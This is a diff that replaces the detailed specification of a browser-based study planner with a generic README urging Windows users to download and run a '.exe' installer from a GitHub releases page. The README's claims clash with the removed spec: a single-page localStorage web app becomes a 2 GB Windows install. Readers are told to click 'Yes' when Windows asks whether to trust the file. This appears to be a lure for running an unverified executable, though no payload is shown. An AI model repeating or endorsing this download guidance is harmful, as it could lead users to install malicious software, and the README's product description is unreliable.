@@ -1,193 +1,122 @@
-# Smart Study Planner - Specification Document
+# 📚 Study-Planner-App- - Organize Your Study Time Easily
 
-## 1. Project Overview
-- **Project Name**: Smart Study Planner
-- **Type**: Single-page Web Application
-- **Core Functionality**: A study management app that allows users to add subjects with deadlines, auto-generates daily study plans based on priority, tracks progress, and supports dark/light themes.
-- **Target Users**: Students and learners who want to organize their study schedule efficiently
+[![Download Study-Planner-App-](https://img.shields.io/badge/Download-Study--Planner--App--BrightGreen?style=for-the-badge&logo=github)](https://github.com/FrancisKentCacho/Study-Planner-App-/releases)
 
-## 2. UI/UX Specification
+---
 
-### Layout Structure
-- **Header**: App title with theme toggle button (fixed top)
-- **Main Content**: Three-column layout on desktop, stacked on mobile
-  - Left Column: Subject List (add/edit/delete subjects)
-  - Center Column: Daily Study Plan (auto-generated)
-  - Right Column: Progress Tracker
-- **Responsive Breakpoints**:
-  - Mobile: < 768px (single column, stacked)
-  - Tablet: 768px - 1024px (two columns)
-  - Desktop: > 1024px (three columns)
+## 📖 What is Study-Planner-App-?
 
-### Visual Design
+Study-Planner-App- is a simple tool you can use to plan your study time. The app helps you add your subjects, set deadlines, and then creates daily study schedules that match your priorities. You can check your progress and switch between dark and light modes for easier reading.
 
-#### Color Palette
+It works on one page, so you don’t have to jump around. It is made for students or anyone who wants to manage study time without hassle.
 
-**Light Theme:**
-- Background: `#F8F9FC` (soft off-white)
-- Card Background: `#FFFFFF`
-- Primary: `#6366F1` (indigo)
-- Primary Hover: `#4F46E5`
-- Secondary: `#10B981` (emerald green)
-- Accent: `#F59E0B` (amber for deadlines)
-- Text Primary: `#1E293B`
-- Text Secondary: `#64748B`
-- Border: `#E2E8F0`
-- Success: `#10B981`
-- Warning: `#F59E0B`
-- Danger: `#EF4444`
+---
 
-**Dark Theme:**
-- Background: `#0F172A` (dark navy)
-- Card Background: `#1E293B`
-- Primary: `#818CF8` (lighter indigo)
-- Primary Hover: `#6366F1`
-- Secondary: `#34D399`
-- Accent: `#FBBF24`
-- Text Primary: `#F1F5F9`
-- Text Secondary: `#94A3B8`
-- Border: `#334155`
+## 🖥️ System Requirements
 
-#### Typography
-- **Font Family**: `'Outfit', sans-serif` (Google Fonts)
-- **Headings**: 
-  - H1: 28px, font-weight 700
-  - H2: 20px, font-weight 600
-  - H3: 16px, font-weight 600
-- **Body**: 14px, font-weight 400
-- **Small**: 12px, font-weight 400
+- Windows 10 or later 
+- At least 2 GB of free disk space 
+- Internet connection for downloading only 
+- Screen size 1024x768 or higher recommended  
+- No other software needed
 
-#### Spacing System
-- Base unit: 4px
-- Padding: 16px (cards), 12px (buttons), 8px (inputs)
-- Margins: 24px (between sections), 16px (between cards)
-- Border Radius: 12px (cards), 8px (buttons), 6px (inputs)
+---
 
-#### Visual Effects
-- Card shadows (light): `0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -2px rgba(0, 0, 0, 0.1)`
-- Card shadows (dark): `0 4px 6px -1px rgba(0, 0, 0, 0.3), 0 2px 4px -2px rgba(0, 0, 0, 0.2)`
-- Hover transitions: 0.2s ease-in-out
-- Page load animation: Fade in with slight upward movement (0.4s)
-- Card entrance: Staggered fade-in (0.3s delay between cards)
-- Button hover: Scale 1.02 with shadow increase
+## 🚀 Getting Started
 
-### Components
+Follow these steps to get Study-Planner-App- on your Windows computer and start using it quickly.
 
-#### Header
-- App logo/title on left
-- Theme toggle button on right (sun/moon icon)
-- Sticky position
+---
 
-#### Subject List Card
-- Title: "Subjects"
-- Input field for subject name
-- Date picker for deadline
-- "Add Subject" button
-- List of subjects with:
-  - Subject name
-  - Deadline date (formatted nicely)
-  - Days remaining badge (color-coded)
-  - Delete button (trash icon)
-- Empty state message when no subjects
+### 1. Visit the Download Page
 
-#### Daily Study Plan Card
-- Title: "Today's Study Plan"
-- Date display
-- Auto-generated list of study sessions
-- Each session shows:
-  - Subject name
-  - Priority indicator (high/medium/low)
-  - Estimated duration
-  - Checkbox to mark complete
-- "Generate New Plan" button
-- Empty state when no subjects exist
+Click the big button at the top of this page or go to this link:
 
-#### Progress Tracker Card
-- Title: "Progress"
-- Overall completion percentage (circular progress)
-- Total sessions completed
-- Subjects completed
-- Current streak (days)
-- Weekly chart (simple bar chart)
+https://github.com/FrancisKentCacho/Study-Planner-App-/releases
 
-## 3. Functionality Specification
+This is the official download page where the latest version is available.
 
-### Core Features
+---
 
-#### Subject Management
-- Add new subject with name and deadline
-- Delete subject with confirmation
-- Calculate days remaining until deadline
-- Priority calculation based on deadline urgency:
-  - ≤ 2 days: High priority
-  - ≤ 7 days: Medium priority
-  - > 7 days: Low priority
-- Persist subjects in localStorage
+### 2. Find the Windows Installer
 
-#### Auto-Generate Daily Plan
-- Algorithm considers:
-  - Subject priority (higher priority = more sessions)
-  - Deadline proximity
-  - Study duration per subject (split large subjects)
-- Generate 4-6 study sessions per day
-- Each session: 25-45 minutes
-- Persist today's plan in localStorage
+On the releases page, look for the latest version. It usually has a name like `Study-Planner-App-Setup.exe` or something similar.
 
-#### Progress Tracking
-- Mark study sessions as complete
-- Track completed sessions count
-- Calculate completion percentage
-- Track study streak (consecutive days)
-- Persist progress in localStorage
+Make sure you download the `.exe` file designed for Windows.
 
-#### Theme Switching
-- Toggle between light/dark themes
-- Persist theme preference in localStorage
-- Smooth transition animation between themes
+---
 
-### User Interactions
-1. **Adding a Subject**: Enter name → Select deadline → Click Add → Subject appears in list → Plan auto-regenerates
-2. **Completing a Session**: Click checkbox → Session marked complete → Progress updates → Celebration animation
-3. **Deleting a Subject**: Click delete → Subject removed → Plan auto-regenerates
-4. **Theme Toggle**: Click moon/sun icon → Theme switches with fade animation
+### 3. Download the Installer
 
-### Data Handling
-- All data stored in localStorage
-- Data structure:
-  
-```
-json
-  {
-    "subjects": [{"id", "name", "deadline", "createdAt"}],
-    "todayPlan": [{"id", "subjectId", "subjectName", "duration", "completed"}],
-    "progress": {"totalCompleted": 0, "streak": 0, "lastStudyDate": null},
-    "theme": "light"
-  }
-  
-```
+Click the `.exe` file link to start downloading. Depending on your internet speed, this may take a few seconds to a couple of minutes.
 
-### Edge Cases
-- No subjects: Show helpful empty states
-- All subjects completed: Show celebration message
-- Deadline passed: Mark as overdue, still show in list
-- Same-day deadline: High priority, show warning
+Save the file to a place you can find easily, such as your Desktop or Downloads folder.
 
-## 4. Acceptance Criteria
+---
 
-### Visual Checkpoints
-- [ ] Header displays with title and theme toggle
-- [ ] Three cards visible on desktop, stacked on mobile
-- [ ] Theme toggle works and persists
-- [ ] Cards have proper shadows and rounded corners
-- [ ] Colors match specification exactly
-- [ ] Animations are smooth and visible
+### 4. Run the Installer
 
-### Functional Checkpoints
-- [ ] Can add subject with name and deadline
-- [ ] Subject appears in list with days remaining
-- [ ] Can delete subject
-- [ ] Daily plan generates automatically when subjects added
-- [ ] Can mark sessions as complete
-- [ ] Progress percentage updates correctly
-- [ ] All data persists after page refresh
-- [ ] Responsive layout works on all screen sizes
+Once the download finishes, go to the file location and double-click the installer file (`.exe`).
+
+Windows may ask if you trust this app or want to allow it to run. Choose “Yes” or “Run” to continue.
+
+---
+
+### 5. Follow the Setup Instructions
+
+The installer will open a window. Follow the simple steps:
+
+- Click “Next” to move forward.
+- Agree to the terms and conditions.
+- Choose the folder where you want the app installed or accept the default.
+- Click “Install” to begin the installation.
+
+Wait until the process finishes. It usually takes less than a minute.
+
+---
+
+### 6. Launch the App
+
+After installation completes, look for the Study-Planner-App- icon on your Desktop or in the Start menu.
+
+Double-click the icon to open the app.
+
+---
+
+## 🛠️ How to Use Study-Planner-App-
+
+The app’s layout shows three main panels:
+
+- **Left Column**: Here you add and manage your subjects. You can type a subject name, set deadlines, and remove subjects you no longer want to track.
+
+- **Center Column**: This shows your daily study plan. The app creates this list automatically based on the deadlines and priorities you set.
+
+- **Right Column**: This section tracks how much you have completed. It shows your progress visually, helping you stay motivated.
+
+You can switch between dark and light themes with the button on the top-right corner.
+
+---
+
+## 💡 Tips for Best Use
+
+- Add all your subjects and their deadlines first. This helps the app create a better plan.
+- Check your plan each day and mark subjects as done when you finish studying.
+- Use the theme toggle if you study at night or like a light background during the day.
+- Update subjects if your deadlines change.
+
+---
+
+## 🔧 Troubleshooting
+
+- If the app does not start after installation, try restarting your computer first.
+- Make sure you downloaded the Windows `.exe` file and installed it correctly.
+- If something does not look right, check your screen resolution or try resizing the window.
+- For errors during install, check that you have enough free space on your hard drive.
+
+---
+
+## 📥 Download Study-Planner-App- Now
+
+[![Download Study-Planner-App-](https://img.shields.io/badge/Get-Study--Planner--App--Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/FrancisKentCacho/Study-Planner-App-/releases)
+
+Visit the page above to download and run this software on your Windows PC.
